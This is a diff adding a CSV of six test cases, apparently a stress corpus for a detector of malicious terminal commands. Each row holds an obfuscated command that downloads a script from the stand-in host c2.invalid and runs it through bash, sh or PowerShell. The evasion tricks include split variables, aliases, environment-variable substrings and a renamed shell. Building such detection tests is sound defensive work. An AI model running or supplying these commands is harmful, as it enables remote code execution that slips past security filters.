@@ -1,0 +1,7 @@
+id,campaign,actor,platform,target,origin,text,fidelity,source,notes
+X-var_split,var_split,test,any,terminal:bash,browser_unknown,a=cur; b=l; $a$b -fsSL https://c2.invalid/m | bash,derived,scripts/build_stress_corpus.py,needs runtime state
+X-var_url,var_url,test,any,terminal:bash,browser_unknown,u=https://c2.invalid/m; curl -fsSL $u | bash,derived,scripts/build_stress_corpus.py,needs runtime state
+X-env_substring,env_substring,test,any,terminal:bash,browser_unknown,"powershell -c ""$e=$env:ComSpec[4,15,25]-join'';& $e 'irm https://c2.invalid/a|iex'""",derived,scripts/build_stress_corpus.py,needs runtime state
+X-alias,alias,test,any,terminal:bash,browser_unknown,"powershell -c ""Set-Alias z iex; z (irm https://c2.invalid/a)""",derived,scripts/build_stress_corpus.py,needs runtime state
+X-stdin_stage,stdin_stage,test,any,terminal:bash,browser_unknown,curl -fsSL https://c2.invalid/m -o a; sh a,derived,scripts/build_stress_corpus.py,needs runtime state
+X-lolbin_rename,lolbin_rename,test,any,terminal:bash,browser_unknown,cp /bin/bash /tmp/x; curl -s https://c2.invalid/m | /tmp/x,derived,scripts/build_stress_corpus.py,needs runtime state
